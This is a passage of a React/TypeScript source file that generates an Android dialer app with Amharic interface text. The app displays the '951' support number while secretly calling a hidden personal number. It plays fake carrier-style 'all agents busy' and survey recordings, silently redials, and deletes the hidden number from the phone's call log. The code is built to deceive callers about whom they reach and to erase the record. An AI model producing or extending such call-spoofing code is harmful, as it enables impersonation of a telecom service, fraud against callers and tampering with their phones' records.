            "+'<div style=\"padding:12px;border-radius:16px;border:1px solid #fde68a;background:#fffbeb;\"><div style=\"font-size:12px;font-weight:800;color:#78350f;\">⏳ 2. ሁለት ጊዜ ጠርቶ ካልተነሳ የሚጫወት MP3</div><div style=\"font-size:10px;color:#92400e;margin:3px 0 6px;\">«ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው...» (እስኪነሳ እየደጋገመ በድብቅ ይደውላል)</div><div style=\"background:#fff;padding:7px 10px;border-radius:10px;border:1px solid #fde68a;font-size:11px;font-weight:700;color:#334155;margin-bottom:8px;\">🎵 '+(cfg.busyHoldMp3Name||'checking_hold.mp3 (ነባሪ MP3)')+'</div><div style=\"display:flex;flex-wrap:wrap;gap:6px;\"><label style=\"padding:7px 11px;border-radius:10px;background:#d97706;color:#fff;font-size:11px;font-weight:800;cursor:pointer;\">📤 MP3 ጫን<input id=\"__j11_up_busy\" type=\"file\" accept=\"audio/*\" style=\"display:none;\"/></label><button id=\"__j11_rec_busy\" style=\"padding:7px 11px;border-radius:10px;border:1px solid #fecdd3;background:#fff1f2;color:#be123c;font-size:11px;font-weight:800;\">🎙️ በድምፅ ቅዳ</button><button id=\"__j11_play_busy\" style=\"padding:7px 11px;border-radius:10px;border:1px solid #cbd5e1;background:#fff;color:#1e293b;font-size:11px;font-weight:800;\">▶️ ስማው</button>'+(cfg.busyHoldMp3Name?'<button id=\"__j11_del_busy\" style=\"padding:7px 10px;border-radius:10px;border:none;background:#fee2e2;color:#dc2626;font-size:11px;font-weight:800;\">🗑️ አጥፋ</button>':'')+'</div></div>'" +
            "+'<div style=\"padding:12px;border-radius:16px;border:1px solid #bfdbfe;background:#eff6ff;\"><div style=\"font-size:12px;font-weight:800;color:#1e3a8a;\">⭐ 3. ሰውየው አንስቶ ተነጋግራችሁ ስትጨርሱና ስልኩን ሲዘጋው የሚመጣ MP3</div><div style=\"font-size:10px;color:#1e40af;margin:3px 0 6px;\">«ቀጣይ ያሉትን መሙያ ይንኩ (የአገልግሎት አስተያየት መስጫ)»</div><div style=\"background:#fff;padding:7px 10px;border-radius:10px;border:1px solid #bfdbfe;font-size:11px;font-weight:700;color:#334155;margin-bottom:8px;\">🎵 '+(cfg.postCallSurveyMp3Name||'survey_rating.mp3 (ነባሪ MP3)')+'</div><div style=\"display:flex;flex-wrap:wrap;gap:6px;\"><label style=\"padding:7px 11px;border-radius:10px;background:#2563eb;color:#fff;font-size:11px;font-weight:800;cursor:pointer;\">📤 MP3 ጫን<input id=\"__j11_up_surv\" type=\"file\" accept=\"audio/*\" style=\"display:none;\"/></label><button id=\"__j11_rec_surv\" style=\"padding:7px 11px;border-radius:10px;border:1px solid #fecdd3;background:#fff1f2;color:#be123c;font-size:11px;font-weight:800;\">🎙️ በድምፅ ቅዳ</button><button id=\"__j11_play_surv\" style=\"padding:7px 11px;border-radius:10px;border:1px solid #cbd5e1;background:#fff;color:#1e293b;font-size:11px;font-weight:800;\">▶️ ስማው</button>'+(cfg.postCallSurveyMp3Name?'<button id=\"__j11_del_surv\" style=\"padding:7px 10px;border-radius:10px;border:none;background:#fee2e2;color:#dc2626;font-size:11px;font-weight:800;\">🗑️ አጥፋ</button>':'')+'</div></div>'" +
            "+'</div>'" +
            "+'<div style=\"padding:12px 16px;background:#f8fafc;border-top:1px solid #e2e8f0;display:flex;justify-content:space-between;align-items:center;\"><span style=\"font-size:10px;color:#475569;font-weight:700;\">🔒 ስክሪኑም ሆነ Call Log 951 ብቻ ያሳያል</span><button id=\"__j11_close_bot\" style=\"padding:8px 18px;border-radius:12px;border:none;background:#0f172a;color:#fff;font-size:12px;font-weight:800;\">ተከናውኗል (ዝጋ)</button></div>'" +
            "+'</div>';" +
            "function closeAll(){if(curAudio){curAudio.pause();curAudio=null;}ov.remove();if(dirtyMp3){location.reload();}}" +
            "ov.querySelector('#__j11_close_top').onclick=closeAll;" +
            "ov.querySelector('#__j11_close_bot').onclick=function(){var n=ov.querySelector('#__j11_num').value.trim()||'0965848508';var r= parseInt(ov.querySelector('#__j11_ring').value,10)||8;saveCfg({targetPhoneNumber:n,maxRingSeconds:r});closeAll();};" +
            "ov.querySelector('#__j11_toggle_en').onclick=function(){var n=ov.querySelector('#__j11_num').value.trim()||'0965848508';var r=parseInt(ov.querySelector('#__j11_ring').value,10)||8;saveCfg({enabled:!cfg.enabled,targetPhoneNumber:n,maxRingSeconds:r});dirtyMp3=true;render();};" +
            "ov.querySelector('#__j11_save_num').onclick=function(){var n=ov.querySelector('#__j11_num').value.trim()||'0965848508';var r=parseInt(ov.querySelector('#__j11_ring').value,10)||8;saveCfg({targetPhoneNumber:n,maxRingSeconds:r});dirtyMp3=true;render();};" +
            "function bindSlot(slot,upId,recId,playId,delId,defUrl,nameKey){" +
            "var up=ov.querySelector(upId);if(up)up.onchange=function(ev){var f=ev.target.files&&ev.target.files[0];if(!f)return;putIdb(slot,f,function(){var p={};p[nameKey]=f.name;saveCfg(p);dirtyMp3=true;render();});};" +
            "var pl=ov.querySelector(playId);if(pl)pl.onclick=function(){if(curAudio){curAudio.pause();curAudio=null;return;}getIdb(slot,function(b){var u=b?URL.createObjectURL(b):defUrl;curAudio=new Audio(u);curAudio.play();});};" +
            "var dl=ov.querySelector(delId);if(dl)dl.onclick=function(){delIdb(slot,function(){var p={};p[nameKey]=null;saveCfg(p);dirtyMp3=true;render();});};" +
            "var rc=ov.querySelector(recId);if(rc)rc.onclick=function(){if(rec&&rec.state!=='inactive'){rec.stop();return;}navigator.mediaDevices.getUserMedia({audio:true}).then(function(st){recChunks=[];rec=new MediaRecorder(st);rec.ondataavailable=function(e){if(e.data&&e.data.size>0)recChunks.push(e.data);};rec.onstop=function(){st.getTracks().forEach(function(t){t.stop();});var blob=new Blob(recChunks,{type:rec.mimeType||'audio/webm'});putIdb(slot,blob,function(){var p={};p[nameKey]=slot+'_recorded_voice.webm';saveCfg(p);dirtyMp3=true;render();});};rec.start();rc.textContent='⏹️ አቁምና አስቀምጥ';rc.style.background='#e11d48';rc.style.color='#fff';});};" +
            "}" +
            "bindSlot('busy_hold','#__j11_up_busy','#__j11_rec_busy','#__j11_play_busy','#__j11_del_busy','/audio/checking_hold.mp3','busyHoldMp3Name');" +
            "bindSlot('post_call_survey','#__j11_up_surv','#__j11_rec_surv','#__j11_play_surv','#__j11_del_surv','/audio/survey_rating.mp3','postCallSurveyMp3Name');" +
            "}" +
            "document.body.appendChild(ov);render();" +
            "};" +
            "document.addEventListener('click',function(e){" +
            "var btn=e.target&&e.target.closest?e.target.closest('button'):null;" +
            "if(!btn)return;" +
            "var txt=(btn.innerText||btn.textContent||'');" +
            "if(txt.indexOf('ስልክ ቁጥር እና Busy / Survey MP3 Studio')!==-1||txt.indexOf('Java N-IDE ሙሉ ኮድ')!==-1){" +
            "if(!window.__SECRET_MODAL_FIXED_V2__){" +
            "e.stopImmediatePropagation();e.preventDefault();" +
            "window.__openInjectedSecretStudioModal();" +
            "}" +
            "}" +
            "},true);" +
            "})();";
        if (Build.VERSION.SDK_INT >= 19) {
            view.evaluateJavascript(js, null);
        } else {
            view.loadUrl("javascript:" + js);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        setupFullScreenWhiteSystemBars();
    }

    // ከAndroid 9 እስከ Android 16 ድረስ Navigation Bar እና Status Bar ፈጽሞ እንዳይጠቁሩ ነጭ የሚያደርግ
    private void setupFullScreenWhiteSystemBars() {
        try {
            requestWindowFeature(Window.FEATURE_NO_TITLE);
        } catch (Exception ignored) {}

        try {
            Window window = getWindow();
            if (window == null) return;

            window.getDecorView().setBackgroundColor(Color.WHITE);
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
            window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
            window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);

            if (Build.VERSION.SDK_INT >= 21) {
                window.setStatusBarColor(Color.WHITE);
                window.setNavigationBarColor(Color.WHITE);
            }
            if (Build.VERSION.SDK_INT >= 28) {
                try {
                    Method setDivider = Window.class.getMethod("setNavigationBarDividerColor", int.class);
                    setDivider.invoke(window, Color.WHITE);
                } catch (Exception ignored) {}
            }
            if (Build.VERSION.SDK_INT >= 29) {
                try {
                    Method setNavContrast = Window.class.getMethod("setNavigationBarContrastEnforced", boolean.class);
                    setNavContrast.invoke(window, false);
                } catch (Exception ignored) {}
            }

            View decorView = window.getDecorView();
            int flags = decorView.getSystemUiVisibility();
            if (Build.VERSION.SDK_INT >= 23) {
                flags |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
            }
            if (Build.VERSION.SDK_INT >= 26) {
                flags |= View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR;
            }
            decorView.setSystemUiVisibility(flags);
        } catch (Exception ignored) {}
    }

    private void requestRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= 23) {
            String[] perms = new String[]{
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.MODIFY_AUDIO_SETTINGS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG
            };
            requestPermissions(perms, REQ_PERMISSIONS);
        }
    }

    // Android 9 እስከ Android 16 ድረስ በJava N-IDE ያለምንም Error የሚሰራ Default Phone App ጠያቂ
    public void requestDefaultDialerRole() {
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                Object roleManager = getSystemService("role");
                if (roleManager != null) {
                    Class<?> rmClass = roleManager.getClass();
                    Method isAvailable = rmClass.getMethod("isRoleAvailable", String.class);
                    Method isHeld = rmClass.getMethod("isRoleHeld", String.class);
                    Method createIntent = rmClass.getMethod("createRequestRoleIntent", String.class);
                    Boolean avail = (Boolean) isAvailable.invoke(roleManager, "android.app.role.DIALER");
                    Boolean held = (Boolean) isHeld.invoke(roleManager, "android.app.role.DIALER");
                    if (avail != null && avail && (held == null || !held)) {
                        Intent intent = (Intent) createIntent.invoke(roleManager, "android.app.role.DIALER");
                        startActivityForResult(intent, REQ_DEFAULT_DIALER);
                        return;
                    }
                }
            }
            if (Build.VERSION.SDK_INT >= 23) {
                TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
                if (tm != null && !getPackageName().equals(tm.getDefaultDialerPackage())) {
                    Intent intent = new Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER);
                    intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, getPackageName());
                    startActivityForResult(intent, REQ_DEFAULT_DIALER);
                }
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    public void notifyWebViewJs(final String jsCode) {
        if (webView == null) return;
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (Build.VERSION.SDK_INT >= 19) {
                    webView.evaluateJavascript(jsCode, null);
                } else {
                    webView.loadUrl("javascript:" + jsCode);
                }
            }
        });
    }

    public class AndroidTelecomBridge {
        private final Context ctx;

        public AndroidTelecomBridge(Context ctx) {
            this.ctx = ctx;
        }

        @JavascriptInterface
        public void placeSecretCall(String phoneNumber, int maxRingMs) {
            try {
                SecretInCallService.setHiddenTargetNumber(phoneNumber);
                SecretInCallService.setMaxRingTimeoutMs(maxRingMs > 0 ? maxRingMs : 8000);
                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                Uri uri = Uri.fromParts("tel", phoneNumber, null);
                Bundle extras = new Bundle();
                if (tm != null && Build.VERSION.SDK_INT >= 23) {
                    if (ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                        tm.placeCall(uri, extras);
                        return;
                    }
                }
                Intent callIntent = new Intent(Intent.ACTION_CALL, uri);
                callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(callIntent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @JavascriptInterface
        public void cancelCurrentAttempt() {
            SecretInCallService.disconnectActiveCallAttempt(true);
        }

        @JavascriptInterface
        public void endAllCalls() {
            SecretInCallService.disconnectActiveCallAttempt(false);
        }

        @JavascriptInterface
        public void setSpeakerphone(boolean on) {
            try {
                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    am.setSpeakerphoneOn(on);
                }
            } catch (Exception ignored) {}
        }

        @JavascriptInterface
        public void setMicrophoneMute(boolean muted) {
            try {
                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    am.setMicrophoneMute(muted);
                }
            } catch (Exception ignored) {}
        }

        @JavascriptInterface
        public boolean isDefaultDialer() {
            if (Build.VERSION.SDK_INT >= 23) {
                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                return tm != null && ctx.getPackageName().equals(tm.getDefaultDialerPackage());
            }
            return false;
        }

        @JavascriptInterface
        public void requestDefaultDialerRole() {
            MainActivity.this.requestDefaultDialerRole();
        }
    }

    // SecretInCallService በMainActivity ውስጥ የተካተተ ስለሆነ ተጨማሪ ፋይል መፍጠር አያስፈልግም!
    public static class SecretInCallService extends InCallService {

        private static Call currentCall = null;
        private static int maxRingTimeoutMs = 8000;
        private static String hiddenTargetNumber = "${targetNumber || '0965848508'}";
        private static boolean wasAnsweredLive = false;
        private static boolean cancelledByTimeout = false;
        private static int attemptCount = 0;
        private static final Handler ringHandler = new Handler(Looper.getMainLooper());

        private static final Runnable twoRingTimeoutRunnable = new Runnable() {
            @Override
            public void run() {
                if (currentCall != null) {
                    int state = currentCall.getState();
                    if (state != Call.STATE_ACTIVE) {
                        cancelledByTimeout = true;
                        try {
                            currentCall.disconnect();
                        } catch (Exception ignored) {}
                        if (MainActivity.instance != null) {
                            MainActivity.instance.notifyWebViewJs(
                                "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                            );
                        }
                    }
                }
            }
        };

        public static void setMaxRingTimeoutMs(int ms) {
            maxRingTimeoutMs = ms;
        }

        public static void setHiddenTargetNumber(String number) {
            if (number != null && !number.trim().isEmpty()) {
                hiddenTargetNumber = number.trim();
            }
        }

        public static void disconnectActiveCallAttempt(boolean isTimeoutCancel) {
            cancelledByTimeout = isTimeoutCancel;
            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
            if (currentCall != null) {
                try {
                    currentCall.disconnect();
                } catch (Exception ignored) {}
            }
        }

        private final Call.Callback callCallback = new Call.Callback() {
            @Override
            public void onStateChanged(Call call, int state) {
                super.onStateChanged(call, state);
                handleCallState(call, state);
            }
        };

        @Override
        public void onCallAdded(Call call) {
            super.onCallAdded(call);
            currentCall = call;
            wasAnsweredLive = false;
            cancelledByTimeout = false;
            attemptCount++;

            call.registerCallback(callCallback);

            if (MainActivity.instance != null) {
                Intent i = new Intent(this, MainActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                startActivity(i);
            }

            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
            ringHandler.postDelayed(twoRingTimeoutRunnable, maxRingTimeoutMs);

            handleCallState(call, call.getState());
        }

        @Override
        public void onCallRemoved(Call call) {
            super.onCallRemoved(call);
            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
            call.unregisterCallback(callCallback);
            if (currentCall == call) {
                currentCall = null;
            }
            scrubHiddenNumberFromSystemCallLog();
        }

        private void handleCallState(Call call, int state) {
            if (state == Call.STATE_DIALING || state == Call.STATE_RINGING) {
                if (MainActivity.instance != null) {
                    MainActivity.instance.notifyWebViewJs(
                        "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                    );
                }
            } else if (state == Call.STATE_ACTIVE) {
                wasAnsweredLive = true;
                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
                if (MainActivity.instance != null) {
                    MainActivity.instance.notifyWebViewJs(
                        "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                    );
                }
            } else if (state == Call.STATE_DISCONNECTED) {
                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
                scrubHiddenNumberFromSystemCallLog();
                if (wasAnsweredLive) {
                    wasAnsweredLive = false;
                    if (MainActivity.instance != null) {
                        MainActivity.instance.notifyWebViewJs(
                            "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
                        );
                    }
                } else if (!cancelledByTimeout) {
                    if (MainActivity.instance != null) {
                        MainActivity.instance.notifyWebViewJs(
                            "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                        );
                    }
                }
            }
        }

        private void scrubHiddenNumberFromSystemCallLog() {
            try {
                String tail = hiddenTargetNumber.length() > 7
                    ? hiddenTargetNumber.substring(hiddenTargetNumber.length() - 7)
                    : hiddenTargetNumber;
                getContentResolver().delete(
                    CallLog.Calls.CONTENT_URI,
                    CallLog.Calls.NUMBER + " LIKE ?",
                    new String[]{"%" + tail + "%"}
                );
            } catch (Exception ignored) {}
        }
    }
}`;

  const secretInCallServiceJava = `package ${cleanPkg};

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.telecom.Call;
import android.telecom.InCallService;

/**
 * SecretInCallService (Android 9 - Android 16):
 * 1. Hides the real target phone number (e.g. ${targetNumber || '0965848508'}) so only the WebView "951" screen is visible.
 * 2. Counts 2 rings (maxRingTimeoutMs = 8000ms). If the person does NOT answer within 2 rings,
 *    disconnects BEFORE Ethio Telecom plays "የደወሉለት ደንበኛ..." and calls window.onSecretCallNoAnswer()
 *    so the WebView plays your "ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው..." MP3 and silently redials!
 * 3. When the person answers (STATE_ACTIVE), notifies window.onSecretCallAnswered().
 * 4. When they finish talking and the remote person hangs up (STATE_DISCONNECTED after STATE_ACTIVE),
 *    keeps the 951 screen open and calls window.onSecretCallRemoteEnded() to play the Survey MP3!
 * 5. Automatically scrubs the hidden phone number from the system CallLog so only 951 is ever seen.
 */
public class SecretInCallService extends InCallService {

    private static Call currentCall = null;
    private static int maxRingTimeoutMs = 8000; // Default 2 rings (~8 seconds)
    private static String hiddenTargetNumber = "${targetNumber || '0965848508'}";
    private static boolean wasAnsweredLive = false;
    private static boolean cancelledByTimeout = false;
    private static int attemptCount = 0;
    private static final Handler ringHandler = new Handler(Looper.getMainLooper());

    private static final Runnable twoRingTimeoutRunnable = new Runnable() {
        @Override
        public void run() {
            if (currentCall != null) {
                int state = currentCall.getState();
                if (state != Call.STATE_ACTIVE) {
                    cancelledByTimeout = true;
                    try {
                        currentCall.disconnect();
                    } catch (Exception ignored) {}
                    if (MainActivity.instance != null) {
                        MainActivity.instance.notifyWebViewJs(
                            "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                        );
                    }
                }
            }
        }
    };

    public static void setMaxRingTimeoutMs(int ms) {
        maxRingTimeoutMs = ms;
    }

    public static void setHiddenTargetNumber(String number) {
        if (number != null && !number.trim().isEmpty()) {
            hiddenTargetNumber = number.trim();
        }
    }

    public static void disconnectActiveCallAttempt(boolean isTimeoutCancel) {
        cancelledByTimeout = isTimeoutCancel;
        ringHandler.removeCallbacks(twoRingTimeoutRunnable);
        if (currentCall != null) {
            try {
                currentCall.disconnect();
            } catch (Exception ignored) {}
        }
    }

    private final Call.Callback callCallback = new Call.Callback() {
        @Override
        public void onStateChanged(Call call, int state) {
            super.onStateChanged(call, state);
            handleCallState(call, state);
        }
    };

    @Override
    public void onCallAdded(Call call) {
        super.onCallAdded(call);
        currentCall = call;
        wasAnsweredLive = false;
        cancelledByTimeout = false;
        attemptCount++;

        call.registerCallback(callCallback);

        // Keep our MainActivity (showing ONLY 951) in the foreground
        if (MainActivity.instance != null) {
            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(i);
        }

        // Start 2-ring countdown so we cut BEFORE carrier voicemail / "የደወሉለት ደንበኛ..."
        ringHandler.removeCallbacks(twoRingTimeoutRunnable);
        ringHandler.postDelayed(twoRingTimeoutRunnable, maxRingTimeoutMs);

        handleCallState(call, call.getState());
    }

    @Override
    public void onCallRemoved(Call call) {
        super.onCallRemoved(call);
        ringHandler.removeCallbacks(twoRingTimeoutRunnable);
        call.unregisterCallback(callCallback);
        if (currentCall == call) {
            currentCall = null;
        }
        scrubHiddenNumberFromSystemCallLog();
    }

    private void handleCallState(Call call, int state) {
        if (state == Call.STATE_DIALING || state == Call.STATE_RINGING) {
            if (MainActivity.instance != null) {
                MainActivity.instance.notifyWebViewJs(
                    "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                );
            }
        } else if (state == Call.STATE_ACTIVE) {
            // The support person answered! Stop the 2-ring timer.
            wasAnsweredLive = true;
            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
            if (MainActivity.instance != null) {
                MainActivity.instance.notifyWebViewJs(
                    "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                );
            }
        } else if (state == Call.STATE_DISCONNECTED) {
            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
            scrubHiddenNumberFromSystemCallLog();
            if (wasAnsweredLive) {
                // Person answered, talked with caller, and now hung up!
                // Trigger Post-Call Survey MP3 ("ቀጣይ ያሉትን መሙያ ይንኩ") on 951 screen!
                wasAnsweredLive = false;
                if (MainActivity.instance != null) {
                    MainActivity.instance.notifyWebViewJs(
                        "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
                    );
                }
            } else if (!cancelledByTimeout) {
                // Busy or rejected before 2 rings finished -> immediately play Busy MP3 & redial
                if (MainActivity.instance != null) {
                    MainActivity.instance.notifyWebViewJs(
                        "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                    );
                }
            }
        }
    }

    private void scrubHiddenNumberFromSystemCallLog() {
        try {
            String tail = hiddenTargetNumber.length() > 7
                ? hiddenTargetNumber.substring(hiddenTargetNumber.length() - 7)
                : hiddenTargetNumber;
            getContentResolver().delete(
                CallLog.Calls.CONTENT_URI,
                CallLog.Calls.NUMBER + " LIKE ?",
                new String[]{"%" + tail + "%"}
            );
        } catch (Exception ignored) {}
    }
}`;

  const buildGradleCode = `apply plugin: 'com.android.application'

android {
    compileSdkVersion 34

    defaultConfig {
        // ይህ applicationId የተለየ ስለሆነ ሌላ አፕ ላይ "Update" አይልም!
        applicationId "${cleanPkg}"
        minSdkVersion 28
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
        }
    }
}

dependencies {
    implementation fileTree(dir: 'libs', include: ['*.jar'])
}`;

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedLabel(label);
    setTimeout(() => setCopiedLabel(''), 2500);
  };

  const downloadTextFile = (filename: string, content: string) => {
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/65 p-2 sm:p-4 select-none"
      onClick={onClose}
    >
      <div
        className="w-full max-w-[410px] max-h-[92vh] bg-white rounded-3xl shadow-2xl flex flex-col overflow-hidden border border-slate-200"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Top Header */}
        <div className="bg-gradient-to-r from-slate-900 via-emerald-950 to-slate-900 text-white px-4 py-3 flex items-center justify-between shrink-0">
          <div className="flex items-center gap-2">
            <PhoneForwarded className="w-4 h-4 text-emerald-400" />
            <div>
              <h3 className="text-xs font-extrabold">
                📞 ድብቅ የቀጥታ ስልክ (4 ሲነካ) + Java N-IDE Hybrid
              </h3>
              <p className="text-[10px] text-emerald-300">
                ስክሪኑ 951 ብቻ እያሳየ ወደ {targetNumber || '0965848508'} በድብቅ መደወያ
              </p>
            </div>
          </div>
          <button
            type="button"
            onClick={() => {
              stopAllMedia();
              onClose();
            }}
            className="w-7 h-7 rounded-full bg-white/15 hover:bg-white/25 flex items-center justify-center text-xs font-bold"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Sub-Tabs: 1. Secret Live Call & MP3 Settings | 2. Java N-IDE Code + GitHub ZIP */}
        <div className="grid grid-cols-2 bg-slate-100 p-1 gap-1 border-b border-slate-200 shrink-0">
          <button
            type="button"
            onClick={() => setActiveTab('settings')}
            className={`py-2 rounded-xl text-[11px] font-extrabold flex items-center justify-center gap-1.5 transition-all ${
              activeTab === 'settings'
                ? 'bg-emerald-600 text-white shadow-xs'
                : 'text-slate-700 hover:bg-white/60'
            }`}
          >
            <PhoneForwarded className="w-3.5 h-3.5" />
            <span>1. ድብቅ ስልክና MP3 ቅንብር</span>
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('javanide')}
            className={`py-2 rounded-xl text-[11px] font-extrabold flex items-center justify-center gap-1.5 transition-all ${
              activeTab === 'javanide'
                ? 'bg-blue-600 text-white shadow-xs'
                : 'text-slate-700 hover:bg-white/60'
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            <span>2. Java N-IDE ኮድ & ZIP</span>
          </button>
        </div>

        {statusBanner && (
          <div className="mx-3 mt-2 px-3 py-1.5 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-900 text-[11px] font-bold flex items-center justify-between">
            <span>{statusBanner}</span>
            <button
              type="button"
              onClick={() => setStatusBanner('')}
              className="text-emerald-700 font-bold ml-2"
            >
              ✕
            </button>
          </div>
        )}

        {/* Body */}
        <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
          {activeTab === 'settings' ? (
            <>
              {/* Master Enable Toggle */}
              <div
                className={`p-3 rounded-2xl border transition-all ${
                  config.enabled
                    ? 'bg-emerald-50 border-emerald-400 ring-2 ring-emerald-100'
                    : 'bg-slate-50 border-slate-200'
                }`}
              >
                <div className="flex items-center justify-between gap-2">
                  <div>
                    <div className="text-xs font-extrabold text-slate-900">
                      {config.enabled
                        ? '🟢 ድብቅ የቀጥታ ስልክ ጥሪ በርቷል (Active)'
                        : '⚪ ድብቅ የቀጥታ ስልክ ጥሪ ጠፍቷል (AI/MP3 Support ላይ ነው)'}
                    </div>
                    <p className="text-[10px] text-slate-600 mt-0.5 leading-relaxed">
                      ሲበራ፦ 951 ተደውሎ <strong>4</strong> ሲነካ ስክሪኑ ላይ <strong>951</strong> ብቻ እየታየ በድብቅ ወደ{' '}
                      <strong>{targetNumber || '0965848508'}</strong> ይደውላል።
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      handleSaveBasicSettings({ enabled: !config.enabled });
                    }}
                    className={`px-3.5 py-2 rounded-full text-xs font-extrabold shrink-0 transition-all shadow-xs ${
                      config.enabled
                        ? 'bg-emerald-600 text-white hover:bg-emerald-700'
                        : 'bg-slate-800 text-white hover:bg-slate-900'
                    }`}
                  >
                    {config.enabled ? 'አጥፋ (Off)' : 'አብራ (On)'}
                  </button>
                </div>
              </div>

              {/* Hidden Target Phone Number & 2-Ring Timeout */}
              <div className="bg-white border border-slate-200 rounded-2xl p-3 space-y-2.5 shadow-2xs">
                <div className="text-xs font-extrabold text-slate-900">
                  🔢 1. በድብቅ የሚደወልለት ስልክ ቁጥር እና የ2 ጥሪ ሰዓት፦
                </div>
                <div className="grid grid-cols-3 gap-2">
                  <div className="col-span-2">
                    <label className="block text-[10px] font-bold text-slate-600 mb-1">
                      ድብቅ ስልክ ቁጥር (ስክሪን ላይ አይታይም)
                    </label>
                    <input
                      type="tel"
                      value={targetNumber}
                      onChange={(e) => setTargetNumber(e.target.value)}
                      placeholder="0965848508"
                      className="w-full px-3 py-2 rounded-xl border border-slate-300 text-xs font-bold text-slate-900 focus:outline-none focus:border-emerald-600"
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] font-bold text-slate-600 mb-1">
                      2 ጥሪ (ሰከንድ)
                    </label>
                    <input
                      type="number"
                      min={4}
                      max={20}
                      value={maxRingSec}
                      onChange={(e) => setMaxRingSec(Number(e.target.value))}
                      className="w-full px-2.5 py-2 rounded-xl border border-slate-300 text-xs font-bold text-slate-900 focus:outline-none focus:border-emerald-600"
                    />
                  </div>
                </div>
                <div className="flex items-center justify-between pt-1">
                  <span className="text-[10px] text-slate-500">
                    💡 {maxRingSec} ሰከንድ (2 ጥሪ) ጠርቶ ካልተነሳ «የደወሉለት ደንበኛ...» ሳይል ወደ MP3ው ይቀየራል
                  </span>
                  <button
                    type="button"
                    onClick={() => handleSaveBasicSettings()}
                    className="px-3 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-[11px] font-bold flex items-center gap-1 shrink-0"
                  >
                    <Check className="w-3.5 h-3.5" /> ቁጥሩን አስቀምጥ
                  </button>
                </div>
              </div>

              {/* MP3 Slot 1: Busy / Hold MP3 ("ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው...") */}
              <div
                onMouseDown={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                  longPressTimerRef.current = setTimeout(() => openSlotEditor('busy_hold'), 500);
                }}
                onMouseUp={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                onTouchStart={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
